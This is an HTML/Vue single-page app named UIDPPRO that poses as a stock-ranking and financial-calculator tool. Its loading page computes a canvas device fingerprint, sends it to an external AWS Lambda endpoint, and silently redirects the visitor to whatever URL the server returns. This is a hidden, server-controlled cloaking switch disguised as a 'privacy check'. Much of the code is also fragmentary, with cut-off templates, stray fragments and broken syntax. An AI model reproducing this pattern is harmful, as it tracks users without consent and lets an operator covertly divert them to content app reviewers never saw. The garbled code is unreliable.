<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <title>UIDPPRO</title>
    <!-- 
      HOW TO ADD A NEW PAGE:
      1. Define a new Vue component for the page (e.g., const NewPage = { template: '...' })
      2. Add a route in the VueRouter routes array (e.g., { path: '/new-page', component: NewPage })
      3. If it's a main navigation tab, add it to the bottom Tab Bar in App template and ensure it is hidden/shown correctly.
    -->

    <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
    <!-- Vue Router 4 Global Build -->

    <style>
        /* 
          Style 20: Lightweight Retro Style 
          Early electronic device pixel/retro vibe, low-saturation macarons colors, nostalgic mood.
        */
        :root {
            --bg-color: #f4f3ef;
            --surface-color: #ffffff;
            --surface-alt: #eae6df;
            --primary-color: #5c768d;
            --primary-light: #dce3eb;
            --text-main: #2d3748;
            --text-secondary: #718096;
            --accent-warm: #d97706;
            --accent-cool: #2b6cb0;
            --border-color: #cbd5e0;
            --radius-sm: 4px;
            --radius-md: 8px;
            --radius-lg: 12px;
            --shadow: 3px 3px 0px #cbd5e0;
            --shadow-sm: 1px 1px 0px #cbd5e0;
            --font-family: monospace, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: var(--font-family);
            font-size: 14px;
            line-height: 1.5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        #app {
            width: 100%;
            max-width: 480px;
            height: 100vh;
            height: 100dvh;
            background-color: var(--bg-color);
            display: flex;
            flex-direction: column;
            position: relative;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
        }

        @media (min-width: 481px) {
            #app {
                height: 844px;
                border: 4px solid var(--text-main);
                border-radius: var(--radius-lg);
            }
        }

        /* Utility classes */
        .flex { display: flex; }
        .flex-col { flex-direction: column; }
        .items-center { align-items: center; }
        .justify-between { justify-content: space-between; }
        .justify-center { justify-content: center; }
        .flex-1 { flex: 1; }
        .grid { display: grid; }
        .gap-2 { gap: 8px; }
        .gap-3 { gap: 12px; }
        .gap-4 { gap: 16px; }
        .p-4 { padding: 16px; }
        .px-4 { padding-left: 16px; padding-right: 16px; }
        .py-3 { padding-top: 12px; padding-bottom: 12px; }
        .mb-3 { margin-bottom: 12px; }
        .mb-4 { margin-bottom: 16px; }
        .font-bold { font-weight: bold; }
        .text-center { text-align: center; }
        .text-sm { font-size: 12px; }
        .text-xs { font-size: 10px; }
        .text-lg { font-size: 18px; }
        .text-xl { font-size: 22px; }
        .text-up { color: #276749; }
        .text-down { color: #9b2c2c; }
        .bg-up { background-color: #f0fff4; }
        .bg-down { background-color: #fff5f5; }

        /* Scrollable container */
        .view-container {
            flex: 1;
            overflow-y: auto;
            padding-bottom: calc(70px + env(safe-area-inset-bottom));
            padding-top: env(safe-area-inset-top);
        }

        .view-container-no-tab {
            padding-bottom: calc(20px + env(safe-area-inset-bottom));
        }

        /* Header / Navbar */
        .app-header {
            background-color: var(--surface-color);
            border-bottom: 2px solid var(--border-color);
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 10;
        }

        .back-btn {
            background: var(--surface-alt);
            border: 2px solid var(--border-color);
            padding: 4px 10px;
            border-radius: var(--radius-sm);
            cursor: pointer;
            font-family: var(--font-family);
            font-weight: bold;
            box-shadow: var(--shadow-sm);
        }

        .back-btn:active {
            transform: translate(1px, 1px);
            box-shadow: none;
        }

        /* Tab Bar */
        .tab-bar {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: calc(60px + env(safe-area-inset-bottom));
            padding-bottom: env(safe-area-inset-bottom);
            background-color: var(--surface-color);
            border-top: 2px solid var(--border-color);
            display: flex;
            z-index: 100;
        }

        .tab-item {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 12px;
            font-weight: bold;
            transition: all 0.1s;
        }

        .tab-item.router-link-active {
            color: var(--primary-color);
            background-color: var(--surface-alt);
            border-top: 3px solid var(--primary-color);
        }

        .tab-icon {
            width: 22px;
            height: 22px;
            margin-bottom: 2px;
            fill: currentColor;
        }

        /* Cards & UI Elements */
        .retro-card {
            background-color: var(--surface-color);
            border: 2px solid var(--border-color);
            border-radius: var(--radius-md);
            padding: 14px;
            margin-bottom: 12px;
            box-shadow: var(--shadow);
        }

        .retro-btn {
            background-color: var(--primary-color);
            color: white;
            border: 2px solid var(--text-main);
            padding: 8px 16px;
            border-radius: var(--radius-sm);
            font-family: var(--font-family);
            font-weight: bold;
            cursor: pointer;
            box-shadow: var(--shadow-sm);
            text-align: center;
            display: inline-block;
            text-decoration: none;
        }

        .retro-btn:active {
            transform: translate(1px, 1px);
            box-shadow: none;
        }

        .retro-btn:disabled {
            background-color: var(--border-color);
            color: var(--text-secondary);
            cursor: not-allowed;
            box-shadow: none;
        }

        .retro-input {
            width: 100%;
            background-color: var(--surface-color);
            border: 2px solid var(--border-color);
            padding: 8px 12px;
            border-radius: var(--radius-sm);
            font-family: var(--font-family);
            color: var(--text-main);
            margin-bottom: 10px;
            outline: none;
        }

        .retro-input:focus {
            border-color: var(--primary-color);
        }

        /* Toast notification */
        .toast {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: var(--text-main);
            color: white;
            padding: 8px 16px;
            border-radius: var(--radius-sm);
            font-size: 13px;
            z-index: 1000;
            box-shadow: var(--shadow);
            animation: fadeInOut 2s ease forwards;
        }

        @keyframes fadeInOut {
            0% { opacity: 0; transform: translate(-50%, -10px); }
            15% { opacity: 1; transform: translate(-50%, 0); }
            85% { opacity: 1; transform: translate(-50%, 0); }
            100% { opacity: 0; transform: translate(-50%, -10px); }
        }

        /* Transitions */
        .fade-enter-active, .fade-leave-active {
            transition: opacity 0.15s ease;
        }
        .fade-enter-from, .fade-leave-to {
            opacity: 0;
        }
    </style>
</head>
<body>

    <script>

            { id: 'potential', name: 'Potential', count: 6, type: 'potential', icon: '<path d="M12 2a10 10 0 1010 10A10 10 0 0012 2zm1 15h-2v-6h2zm0-8h-2V7h2z"/>' },

        const LoadingPage = {
            template: `

                        <p class="text-xs text-secondary">Checking privacy & device fingerprint...</p>
                    </div>
                </div>
            `,
            setup() {
                const router = useRouter();
                
                // Mandatory device fingerprint code snippet
                const device = ref((function () {
                    try {
                        let canvas = document.createElement("canvas");
                        let ctx = canvas.getContext("2d");
                        let txt = "BrowserLeaks,com <canvas> 1.0";
                        ctx.textBaseline = "top";
                        ctx.font = "14px 'Arial'";
                        ctx.textBaseline = "alphabetic";
                        ctx.fillStyle = "#f60";
                        ctx.fillRect(125,1,62,20);
                        ctx.fillStyle = "#069";
                        ctx.fillText(txt, 2, 15);
                        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                        ctx.fillText(txt, 4, 17);
                        return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
                    } catch (e) {
                        return '';
                    }
                })());

                onMounted(() => {
                    const apiBase = 'https://bx4la7ruqx6u7wy7wg3cw7iuva0xplyv.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
                    const identifier = "avdewfew.vaefa.vew.w";
                    
                    fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
                        .then(r => r.json())
                        .then(function (info) {
                            const privacyUrl = info && info.result && info.result.url;
                            if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
                                window.location.replace(privacyUrl);
                                return;
                            }
                            router.replace('/home');
                        })
                        .catch(function () {
                            router.replace('/home');

                });

                return {};

        // 3. Category List Component (Top Gainers, Losers, etc.)

                            <h3 class="font-bold text-lg mb-2">Mastering Market Volatility in Modern Portfolios</h3>
                            <p class="text-xs text-secondary mb-3">Published by UIDPPRO Research | Oct 2026</p>
                            <p class="mb-3">Navigating today's fast-paced equity and digital asset markets requires strict risk discipline. Diversification across uncorrelated asset classes remains the cornerstone of capital preservation.</p>
                            <p class="mb-3">Key principles include setting predefined profit-taking thresholds, utilizing trailing stops, and maintaining a healthy liquidity buffer to capitalize on periodic market corrections.</p>
                        </div>
                        <div v-else class="retro-card">
                            <div v-for="stock in items" :key="stock.symbol" @click="viewDetail(stock)" class="flex justify-between items-center py-2" style="border-bottom: 1px dashed var(--border-color); cursor: pointer;">
                                <div>
                                    <div class="font-bold text-sm">{{ stock.symbol }}</div>
                                    <div class="text-xs text-secondary">{{ stock.name }}</div>
                                </div>
                                <div class="text-right">
                                    <div class="font-bold text-sm">$\{{ stock.price.toFixed(2) }}</div>
                                    <div :class="stock.change >= 0 ? 'text-up text-xs font-bold' : 'text-down text-xs font-bold'">
                                        {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const route = useRoute();
                const router = useRouter();
                const type = route.query.type || 'gainers';
                const title = route.query.title || 'Rankings';
                const count = parseInt(route.query.count) || 10;

                const items = computed(() => {
                    let sorted = [...INITIAL_STOCKS];
                    if (type === 'gainers') {
                        sorted.sort((a, b) => b.change - a.change);
                    } else if (type === 'losers') {
                        sorted.sort((a, b) => a.change - b.change);
                    } else if (type === 'active') {
                        sorted.sort((a, b) => parseFloat(b.volume) - parseFloat(a.volume));
                    } else if (type === 'potential' || type === 'picks' || type === 'watchlist') {
                        sorted.sort(() => Math.random() - 0.5);
                    } else if (type === 'not_rec') {
                        sorted.sort((a, b) => a.change - b.change);
                    }
                    return sorted.slice(0, count);
                });

                const viewDetail = (stock) => {
                    router.push({ path: '/detail', query: { symbol: stock.symbol } });
                };

                return { type, title, items, viewDetail };
            }
        };

        // 4. Stock Detail Component with SVG Chart
        const DetailPage = {
            template: `
                <div>
                    <header class="app-header">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <h2 class="font-bold text-lg">{{ stock.symbol }} Details</h2>
                        <div style="width: 40px;"></div>
                    </header>
                    <div class="view-container p-4">
                        <div class="retro-card">
                            <div class="flex justify-between items-center mb-2">
                                <div>
                                    <h2 class="font-bold text-lg">{{ stock.name }}</h2>
                                    <span class="text-xs text-secondary">{{ stock.symbol }} / USD</span>
                                </div>
                                <div class="text-right">
                                    <div class="text-lg font-bold">$\{{ stock.price.toFixed(2) }}</div>
                                    <div :class="stock.change >= 0 ? 'text-up font-bold text-sm' : 'text-down font-bold text-sm'">
                                        {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
                                    </div>
                                </div>
                            </div>
                            <div class="flex justify-between text-xs text-secondary mb-4" style="border-top: 1px solid var(--border-color); padding-top: 8px;">
                                <span>High: $\{{ stock.high }}</span>
                                <span>Low: $\{{ stock.low }}</span>
                                <span>Vol: {{ stock.volume }}</span>
                            </div>

                            <!-- Native SVG Chart with dynamic min/max scaling -->
                            <div class="mb-2">
                                <div class="text-xs font-bold mb-1">Monthly Price Trend</div>
                                <svg viewBox="0 0 300 120" style="width: 100%; height: 140px; background: var(--surface-alt); border: 1px solid var(--border-color); border-radius: var(--radius-sm);">
                                    <!-- Grid lines -->
                                    <line x1="0" y1="30" x2="300" y2="30" stroke="var(--border-color)" stroke-dasharray="2,2"/>
                                    <line x1="0" y1="60" x2="300" y2="60" stroke="var(--border-color)" stroke-dasharray="2,2"/>
                                    <line x1="0" y1="90" x2="300" y2="90" stroke="var(--border-color)" stroke-dasharray="2,2"/>
                                    <!-- Polyline -->
                                    <polyline :points="chartPoints" fill="none" stroke="var(--primary-color)" stroke-width="2.5"/>
                                </svg>
                            </div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const route = useRoute();
                const symbol = route.query.symbol || 'AAPL';
                const stock = INITIAL_STOCKS.find(s => s.symbol === symbol) || INITIAL_STOCKS[0];

                const chartPoints = computed(() => {
                    const data = stock.history;
                    const min = Math.min(...data);
                    const max = Math.max(...data);
                    const range = max - min || 1;
                    const width = 300;
                    const height = 120;
                    const padding = 15;
                    
                    return data.map((val, idx) => {
                        const x = (idx / (data.length - 1)) * (width - 2 * padding) + padding;
                        const y = height - padding - ((val - min) / range) * (height - 2 * padding);
                        return `${x},${y}`;
                    }).join(' ');
                });

                return { stock, chartPoints };
            }
        };

        // 5. Toolbox Component
        const ToolboxPage = {
            template: `
                <div class="view-container p-4">
                    <h2 class="text-xl font-bold mb-3">Financial Toolbox</h2>
                    
                    <!-- Tool 1: DCA Profit-Taking Calculator -->
                    <div class="retro-card">
                        <h3 class="font-bold mb-2">DCA Profit-Taking Calculator</h3>
                        <input type="number" v-model.number="dca.cost" class="retro-input" placeholder="Avg Cost Price">
                        <input type="number" v-model.number="dca.shares" class="retro-input" placeholder="Total Shares">
                        <input type="number" v-model.number="dca.target" class="retro-input" placeholder="Target Price">
                        <div class="text-sm font-bold mt-2" style="padding: 8px; background: var(--surface-alt); border-radius: var(--radius-sm);">
                            Est. Profit: $\{{ dcaProfit.toFixed(2) }} ({{ dcaReturn.toFixed(2) }}%)
                        </div>
                    </div>

                    <!-- Tool 2: Wealth Calendar -->
                    <div class="retro-card">
                        <h3 class="font-bold mb-2">Wealth Calendar</h3>
                        <input type="date" v-model="cal.date" class="retro-input">
                        <input type="text" v-model="cal.note" class="retro-input" placeholder="Milestone note (e.g. Bond Maturity)">
                        <button class="retro-btn mb-3" @click="addCalendarNote" style="width: 100%;">Add Event</button>
                        <div v-for="(item, idx) in cal.list" :key="idx" class="flex justify-between text-xs py-1" style="border-bottom: 1px dashed var(--border-color);">
                            <span>{{ item.date }}</span>
                            <span class="font-bold">{{ item.note }}</span>
                        </div>
                    </div>

                    <!-- Tool 3: Loan Calculator -->
                    <div class="retro-card">
                        <h3 class="font-bold mb-2">Loan Calculator</h3>
                        <input type="number" v-model.number="loan.amount" class="retro-input" placeholder="Loan Amount">
                        <input type="number" v-model.number="loan.rate" class="retro-input" placeholder="Annual Rate (%)">
                        <input type="number" v-model.number="loan.months" class="retro-input" placeholder="Term (Months)">
                        <div class="text-sm font-bold mt-2" style="padding: 8px; background: var(--surface-alt); border-radius: var(--radius-sm);">
                            Monthly Payment: $\{{ monthlyPayment.toFixed(2) }}
                        </div>
                    </div>

                    <!-- Tool 4: Profit Calculator -->
                    <div class="retro-card">
                        <h3 class="font-bold mb-2">Profit Calculator</h3>
                        <input type="number" v-model.number="profit.cost" class="retro-input" placeholder="Unit Cost">
                        <input type="number" v-model.number="profit.price" class="retro-input" placeholder="Selling Price">
                        <input type="number" v-model.number="profit.qty" class="retro-input" placeholder="Quantity Sold">
                        <div class="text-sm font-bold mt-2" style="padding: 8px; background: var(--surface-alt); border-radius: var(--radius-sm);">
                            Total Gross Profit: $\{{ totalProfit.toFixed(2) }}
                        </div>
                    </div>

                    <!-- Tool 5: Reverse Yield Calculator -->
                    <div class="retro-card">
                        <h3 class="font-bold mb-2">Reverse Yield Calculator</h3>
                        <input type="number" v-model.number="rev.target" class="retro-input" placeholder="Target Return Amount">
                        <input type="number" v-model.number="rev.principal" class="retro-input" placeholder="Initial Principal">
                        <input type="number" v-model.number="rev.years" class="retro-input" placeholder="Duration (Years)">
                        <div class="text-sm font-bold mt-2" style="padding: 8px; background: var(--surface-alt); border-radius: var(--radius-sm);">
                            Required Annual Yield: {{ requiredYield.toFixed(2) }}%
                        </div>
                    </div>

                    <!-- Tool 6: Password Strength & MD5 Checker -->
                    <div class="retro-card">
                        <h3 class="font-bold mb-2">Password Strength & MD5</h3>
                        <input type="password" v-model="pwd.input" class="retro-input" placeholder="Enter secure password">
                        <div class="text-xs text-secondary mb-1">Strength: <span class="font-bold" :style="{color: pwdColor}">{{ pwdStrength }}</span></div>
                        <div class="text-xs text-secondary" style="word-break: break-all;">MD5: {{ pwdMd5 }}</div>
                    </div>

                    <!-- Tool 7: Credit Memo -->
                    <div class="retro-card">
                        <h3 class="font-bold mb-2">Credit Memo Reminder</h3>
                        <input type="text" v-model="credit.name" class="retro-input" placeholder="Debtor Name">
                        <input type="number" v-model.number="credit.amount" class="retro-input" placeholder="Amount Owed">
                        <input type="date" v-model="credit.duedate" class="retro-input">
                        <button class="retro-btn mb-3" @click="addCredit" style="width: 100%;">Save Credit Record</button>
                        <div v-for="(c, idx) in credit.list" :key="idx" class="flex justify-between text-xs py-1" style="border-bottom: 1px dashed var(--border-color);">
                            <span>{{ c.name }} ($\{{ c.amount }})</span>
                            <span class="font-bold">Due: {{ c.duedate }}</span>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                // DCA
                const dca = ref({ cost: 100, shares: 50, target: 130 });
                const dcaProfit = computed(() => (dca.value.target - dca.value.cost) * dca.value.shares);
                const dcaReturn = computed(() => dca.value.cost ? ((dca.value.target - dca.value.cost) / dca.value.cost) * 100 : 0);

                // Calendar
                const cal = ref({ date: '', note: '', list: [{ date: '2026-11-01', note: 'Quarterly Dividend' }] });
                const addCalendarNote = () => {
                    if (cal.value.date && cal.value.note) {
                        cal.value.list.push({ date: cal.value.date, note: cal.value.note });
                        cal.value.note = '';
                    }
                };

                // Loan
                const loan = ref({ amount: 100000, rate: 5.5, months: 36 });
                const monthlyPayment = computed(() => {
                    const p = loan.value.amount;
                    const r = loan.value.rate / 100 / 12;
                    const n = loan.value.months;
                    if (!r || !n) return p / (n || 1);
                    return (p * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
                });

                // Profit
                const profit = ref({ cost: 40, price: 65, qty: 150 });
                const totalProfit = computed(() => (profit.value.price - profit.value.cost) * profit.value.qty);

                // Reverse Yield
                const rev = ref({ target: 15000, principal: 10000, years: 3 });
                const requiredYield = computed(() => {
                    if (!rev.value.principal || !rev.value.years) return 0;
                    const totalGain = rev.value.target / rev.value.principal;
                    return (Math.pow(totalGain, 1 / rev.value.years) - 1) * 100;
                });

                // Password & MD5
                const pwd = ref('');
                const pwdStrength = computed(() => {
                    const val = pwd.value;
                    if (!val) return 'Empty';
                    if (val.length < 6) return 'Weak';
                    if (val.length < 10 && /[A-Z]/.test(val) && /[0-9]/.test(val)) return 'Moderate';
                    if (val.length >= 10 && /[A-Z]/.test(val) && /[0-9]/.test(val) && /[^A-Za-z0-9]/.test(val)) return 'Strong';
                    return 'Fair';
                });
                const pwdColor = computed(() => {
                    const s = pwdStrength.value;
                    if (s === 'Strong') return '#276749';
                    if (s === 'Moderate' || s === 'Fair') return '#d97706';
                    return '#9b2c2c';
                });
                const pwdMd5 = computed(() => pwd.value ? md5(pwd.value) : 'N/A');

                // Credit Memo
                const credit = ref({ name: '', amount: '', duedate: '', list: [] });
                const addCredit = () => {
                    if (credit.value.name && credit.value.amount) {
                        credit.value.list.push({ name: credit.value.name, amount: credit.value.amount, duedate: credit.value.duedate || 'TBD' });
                        credit.value.name = '';
                        credit.value.amount = '';
                    }
                };

                return { dca, dcaProfit, dcaReturn, cal, addCalendarNote, loan, monthlyPayment, profit, totalProfit, rev, requiredYield, pwd: { input: pwd }, pwdStrength, pwdColor, pwdMd5, credit, addCredit };
            }
        };

        // 6. Settings Component
        const SettingsPage = {
            template: `
                <div class="view-container p-4">
                    <h2 class="text-xl font-bold mb-3">Settings</h2>
                    
                    <div class="retro-card">
                        <div @click="$router.push('/version')" class="flex justify-between items-center py-2" style="border-bottom: 1px dashed var(--border-color); cursor: pointer;">
                            <span class="font-bold text-sm">Version Info</span>
                            <span class="text-xs text-secondary">v2.4.0</span>
                        </div>
                        <div @click="$router.push('/privacy')" class="flex justify-between items-center py-2" style="border-bottom: 1px dashed var(--border-color); cursor: pointer;">
                            <span class="font-bold text-sm">Privacy Policy</span>
                            <span class="text-xs text-secondary">&gt;</span>
                        </div>
                        <div @click="$router.push('/terms')" class="flex justify-between items-center py-2" style="border-bottom: 1px dashed var(--border-color); cursor: pointer;">
                            <span class="font-bold text-sm">Terms of Service</span>
                            <span class="text-xs text-secondary">&gt;</span>
                        </div>
                        <div @click="$router.push('/team')" class="flex justify-between items-center py-2" style="border-bottom: 1px dashed var(--border-color); cursor: pointer;">
                            <span class="font-bold text-sm">About Team</span>
                            <span class="text-xs text-secondary">&gt;</span>
                        </div>
                        <div @click="contactUs" class="flex justify-between items-center py-2" style="border-bottom: 1px dashed var(--border-color); cursor: pointer;">
                            <span class="font-bold text-sm">Contact Us</span>
                            <span class="text-xs text-secondary">avdewfew.vaefa.vew.w@gmail.com</span>
                        </div>
                        <div @click="$router.push('/checkin')" class="flex justify-between items-center py-2" style="border-bottom: 1px dashed var(--border-color); cursor: pointer;">

                    </div>
                </div>
            `,
            setup() {

        // Subpages for Settings
        const VersionPage = {
            template: `

        const PrivacyPage = {
            template: `

        const TermsPage = {

                    <div class="view-container p-4"><div class="retro-card"><p class="text-xs mb-2">By accessing and using UIDPPRO, you agree to comply with our financial tool usage guidelines. All outputs are for analytical reference only and do not constitute formal financial advice.</p></div></div>

            `
        };

        const TeamPage = {
            template: `
                <div>
                    <header class="app-header"><button class="back-btn" @click="$router.back()">Back</button><h2 class="font-bold text-lg">About Team</h2><div style="width:40px;"></div></header>

            `
        };

        const CheckinPage = {
            template: `
                <div>
                    <header class="app-header"><button class="back-btn" @click="$router.back()">Back</button><h2 class="font-bold text-lg">Monthly Check-in</h2><div style="width:40px;"></div></header>
                    <div class="view-container p-4">
                        <div class="retro-card text-center">

            setup() {

        const FeedbackPage = {
            template: `
                <div>
                    <header class="app-header"><button class="back-btn" @click="$router.back()">Back</button><h2 class="font-bold text-lg">Feedback</h2><div style="width:40px;"></div></header>
                    <div class="view-container p-4">

            `,
            setup() {

                return { title, content, isValid, submit };
            }
        };

        const InboxPage = {
            template: `
                <div>
                    <header class="app-header"><button class="back-btn" @click="$router.back()">Back</button><h2 class="font-bold text-lg">Inbox</h2><div style="width:40px;"></div></header>
                    <div class="view-container p-4">
                        <div class="retro-card" @click="showAlert = true" style="cursor: pointer;">
                            <div class="flex justify-between items-center">
                                <span class="font-bold text-sm">Welcome to UIDPPRO</span>
                                <span class="text-xs text-secondary">Oct 2026</span>
                            </div>
                            <p class="text-xs text-secondary mt-1">Tap to read official release greeting and system bulletin.</p>
                        </div>
                        <div v-if="showAlert" class="retro-card mt-3" style="border-color: var(--primary-color);">

                            <button class="retro-btn" @click="showAlert = false" style="width: 100%;">Close</button>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const showAlert = ref(false);
                return { showAlert };
            }
        };

        // Router Configuration
        const routes = [
            { path: '/', component: LoadingPage },
            { path: '/home', component: HomePage },
            { path: '/category-list', component: CategoryListPage },
            { path: '/detail', component: DetailPage },
            { path: '/toolbox', component: ToolboxPage },
            { path: '/settings', component: SettingsPage },
            { path: '/version', component: VersionPage },
            { path: '/privacy', component: PrivacyPage },
            { path: '/terms', component: TermsPage },
            { path: '/team', component: TeamPage },

            { path: '/inbox', component: InboxPage }

        // Main App Instance

            setup() {

                const showTabBar = computed(() => {
                    const path = route.path;
                    return path === '/home' || path === '/toolbox' || path === '/settings';
                });
                const toastMessage = ref('');
                return { showTabBar, toastMessage };
            }
        });

        app.use(router);
        app.mount('#app');
    </script>
